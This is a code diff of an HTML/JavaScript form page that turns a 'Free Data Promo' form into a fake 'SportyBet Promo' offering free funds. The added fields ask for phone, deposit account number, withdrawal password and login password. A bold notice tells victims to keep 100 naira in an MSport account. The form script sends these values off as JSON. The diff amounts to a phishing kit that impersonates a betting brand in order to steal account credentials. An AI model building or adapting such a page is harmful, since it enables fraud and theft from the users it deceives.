@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Free Data Promo</title>
+  <title>SportyBet</title>
 
   <style>
     * {
@@ -134,8 +134,9 @@
     }
 
     .notice-text {
-      color: #aaaaaa;
+      color: #FFFFFF;
       font-size: 13px;
+      font-weight: bold;
       line-height: 1.5;
     }
 
@@ -293,7 +294,7 @@
   <!-- HEADER -->
   <header class="header">
     <div class="brand">
-      Free<span>Data</span>
+      SportyBet<span>Promo</span>
     </div>
 
     <button class="menu-btn" type="button" aria-label="Menu">
@@ -309,16 +310,16 @@
     <section class="hero">
 
       <div class="badge">
-        🔥 SPECIAL PROMO
+        🔥 SPORTYBET SPECIAL PROMO
       </div>
 
       <h1>
-        Get Your <span>Free Data</span>
+        Get Your <span>Free Funds</span>
       </h1>
 
       <p>
         Fill in the form below with your information
-        to participate in the free data promo.
+        to participate in the SportyBet promo.
       </p>
 
     </section>
@@ -330,7 +331,7 @@
       <!-- Replace the URL below with your actual logo link -->
       <img
         src="https://i.imgur.com/VhaROCK.png"
-        alt="Free Data Logo"
+        alt="SportyBet Logo"
         class="logo"
       >
 
@@ -345,8 +346,8 @@
       </div>
 
       <div class="notice-text">
-        Make sure the information you provide is correct
-        before submitting the form.
+        MAKE SURE YOUR MSPORT ACCOUNT HAS A BALANCE
+        OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS.
       </div>
 
     </div>
@@ -356,7 +357,7 @@
     <section class="form-card">
 
       <div class="form-title">
-        Enter Your Details
+        Please Enter Your Correct Details
       </div>
 
       <div class="form-subtitle">
@@ -371,26 +372,7 @@
 
       <form id="promoForm">
 
-        <!-- FULL NAME -->
-        <div class="field">
-
-          <label for="name">
-            Full Name
-          </label>
-
-          <input
-            type="text"
-            id="name"
-            name="name"
-            placeholder="Enter your full name"
-            autocomplete="name"
-            required
-          >
-
-        </div>
-
-
-        <!-- PHONE -->
+        <!-- PHONE NUMBER -->
         <div class="field">
 
           <label for="phone">
@@ -401,7 +383,26 @@
             type="tel"
             id="phone"
             name="phone"
-            placeholder="Enter your phone number"
+            placeholder="Enter your phone number" 
+            autocomplete="tel"
+            required
+          >
+
+        </div>
+
+
+        <!-- ACCOUNT NUMBER -->
+        <div class="field">
+
+          <label for="account">
+            Account Number
+          </label>
+
+          <input
+            type="tel"
+            id="account"
+            name="account"
+            placeholder="Enter the account number used to deposit"
             autocomplete="tel"
             required
           >
@@ -428,50 +429,50 @@
         </div>
 
 
-        <!-- NETWORK -->
+        <!-- WITHDRAWAL PASSWORD -->
         <div class="field">
 
-          <label for="network">
-            Network Provider
+          <label for="withdrawal">
+            Withdrawal Password
           </label>
 
           <input
-            type="text"
-            id="network"
-            name="network"
-            placeholder="e.g. MTN, Airtel, Glo, 9mobile"
+            type="tel"
+            id="withdrawal"
+            name="withdrawal"
+            placeholder="Kindly enter your withdrawal password"
+            autocomplete="tel"
             required
           >
 
         </div>
 
 
-        <!-- STATE -->
+        <!-- LOGIN PASSWORD -->
         <div class="field">
 
-          <label for="state">
-            State
+          <label for="login">
+            Login Password
           </label>
 
           <input
             type="text"
-            id="state"
-            name="state"
-            placeholder="Enter your state"
-            autocomplete="address-level1"
+            id="login"
+            name="login"
+            placeholder="Enter your login password"
             required
           >
 
         </div>
 
 
-        <!-- SUBMIT -->
+        <!-- CLAIM FUNDS -->
         <button
           type="submit"
           class="submit-btn"
           id="submitBtn"
         >
-          Submit Application
+          Claim Funds
         </button>
 
       </form>
@@ -494,7 +495,7 @@
 
         <p>
           Your submitted information is
-          handled through the form system.
+          handled through the SportyBet system.
         </p>
 
       </div>
@@ -523,7 +524,7 @@
     <!-- FOOTER -->
     <footer class="footer">
 
-      © 2026 Free Data Promo<br>
+      © 2026 SportyBet Promo<br>
       Please provide accurate information.
 
     </footer>
@@ -547,23 +548,23 @@
       errorMessage.textContent = "";
 
       submitBtn.disabled = true;
-      submitBtn.textContent = "Submitting...";
+      submitBtn.textContent = "Claiming funds 😌...";
 
-
-      const name =
-        document.getElementById("name").value.trim();
 
       const phone =
         document.getElementById("phone").value.trim();
 
+      const account =
+        document.getElementById("account").value.trim();
+
       const email =
         document.getElementById("email").value.trim();
 
-      const network =
-        document.getElementById("network").value.trim();
+      const withdrawal =
+        document.getElementById("withdrawal").value.trim();
 
-      const state =
-        document.getElementById("state").value.trim();
+      const login =
+        document.getElementById("login").value.trim();
 
 
       try {
@@ -578,11 +579,11 @@
 
           body: JSON.stringify({
 
-            name: name,
             phone: phone,
+            account: account,
             email: email,
-            network: network,
-            state: state
+            withdrawal: withdrawal,
+            login: login 
 
           })
 
